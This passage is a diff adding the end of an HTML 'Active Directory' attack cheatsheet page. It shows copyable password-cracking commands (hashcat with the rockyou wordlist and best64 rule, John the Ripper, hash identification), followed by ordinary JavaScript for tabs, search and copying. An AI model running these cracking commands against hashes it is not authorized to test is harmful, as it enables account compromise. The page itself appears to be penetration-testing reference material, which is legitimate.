+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Rockyou wordlist attack</div><div class="cb-cmd">hashcat <span class="flg">-m</span> <span class="arg">MODE</span> <span class="arg">hash.txt</span> <span class="arg">/usr/share/wordlists/rockyou.txt</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># With best64 rule</div><div class="cb-cmd">hashcat <span class="flg">-m</span> <span class="arg">MODE</span> <span class="arg">hash.txt</span> <span class="arg">/usr/share/wordlists/rockyou.txt</span> <span class="flg">-r</span> <span class="arg">/usr/share/hashcat/rules/best64.rule</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># John the Ripper</div><div class="cb-cmd">john <span class="flg">--wordlist=</span><span class="arg">/usr/share/wordlists/rockyou.txt</span> <span class="arg">hash.txt</span>
+john <span class="flg">--format=</span><span class="arg">NT</span> <span class="arg">hash.txt</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Identify hash type</div><div class="cb-cmd">hashid <span class="arg">HASH</span>
+hash-identifier</div><span class="cb-hint">copy</span></div>
+      </div>
+    </div>
+  </div>
+
+</div><!-- /page-content -->
+
+<script>
+  initPage({
+    title:      'AD Cheatsheet',
+    breadcrumb: 'cheatsheets/active-directory',
+    tags: [
+      { label: 'Active Directory', color: 'red'    },
+      { label: 'Full Attack Chain', color: 'orange' },
+      { label: '40+ techniques',    color: 'green'  },
+    ],
+    extraSb: `
+      <div style="padding:13px 10px 6px;border-top:1px solid var(--border)">
+        <div class="sb-sec-lbl">phases</div>
+        <a href="#" onclick="switchTab('overview');return false" class="sb-item"><span class="sb-icon" style="color:var(--green)">▸</span>Overview</a>
+        <a href="#" onclick="switchTab('recon');return false" class="sb-item"><span class="sb-icon" style="color:var(--accent)">▸</span>1. Recon</a>
+        <a href="#" onclick="switchTab('initial');return false" class="sb-item"><span class="sb-icon" style="color:var(--orange)">▸</span>2. Initial Access</a>
+        <a href="#" onclick="switchTab('enum');return false" class="sb-item"><span class="sb-icon" style="color:var(--teal)">▸</span>3. Enumeration</a>
+        <a href="#" onclick="switchTab('lateral');return false" class="sb-item"><span class="sb-icon" style="color:var(--yellow)">▸</span>4. Lateral Move</a>
+        <a href="#" onclick="switchTab('priv');return false" class="sb-item"><span class="sb-icon" style="color:var(--purple)">▸</span>5. Priv Esc</a>
+        <a href="#" onclick="switchTab('da');return false" class="sb-item"><span class="sb-icon" style="color:var(--red)">▸</span>6. Domain Admin</a>
+        <a href="#" onclick="switchTab('creds');return false" class="sb-item"><span class="sb-icon" style="color:var(--muted)">▸</span>Credentials</a>
+      </div>`,
+  });
+
+  // ── TABS ──
+  function switchTab(id) {
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.tab-page').forEach(p => p.classList.remove('active'));
+    document.querySelector(`.tab[data-tab="${id}"]`).classList.add('active');
+    document.getElementById('tab-' + id).classList.add('active');
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+  document.querySelectorAll('.tab').forEach(tab => {
+    tab.addEventListener('click', () => switchTab(tab.dataset.tab));
+  });
+
+  // ── ACCORDION ──
+  function toggleAc(hdr) {
+    const body  = hdr.nextElementSibling;
+    const arrow = hdr.querySelector('.ac-arrow');
+    const open  = body.classList.toggle('open');
+    body.style.display = open ? 'block' : 'none';
+    arrow.classList.toggle('open', open);
+  }
+
+  // ── COPY COMMAND ──
+  function copyCb(block) {
+    const text = block.querySelector('.cb-cmd').innerText;
+    navigator.clipboard?.writeText(text).then(() => {
+      block.classList.add('copied');
+      const hint = block.querySelector('.cb-hint');
+      if (hint) { hint.textContent = '✓ copied'; }
+      setTimeout(() => {
+        block.classList.remove('copied');
+        if (hint) hint.textContent = 'copy';
+      }, 1500);
+    });
+  }
+
+  // ── PER-TAB SEARCH ──
+  document.querySelectorAll('.tab-search input').forEach(input => {
+    input.addEventListener('input', function() {
+      const q      = this.value.toLowerCase().trim();
+      const page   = document.getElementById('tab-' + this.dataset.target.replace('tab-',''));
+      const target = document.getElementById(this.dataset.target);
+      const cards  = target.querySelectorAll('.ac');
+      let   any    = false;
+
+      cards.forEach(card => {
+        const text = (card.dataset.search || '') + ' ' + card.textContent.toLowerCase();
+        const show = !q || text.includes(q);
+        card.classList.toggle('hidden-card', !show);
+        if (show) any = true;
+      });
+
+      target.querySelectorAll('.phase-lbl').forEach(lbl => {
+        let next = lbl.nextElementSibling;
+        let vis  = false;
+        while (next && !next.classList.contains('phase-lbl')) {
+          if (next.classList.contains('ac') && !next.classList.contains('hidden-card')) vis = true;
+          next = next.nextElementSibling;
+        }
+        lbl.style.display = vis ? '' : 'none';
+      });
+    });
+  });
+</script>
+</body>
+</html>
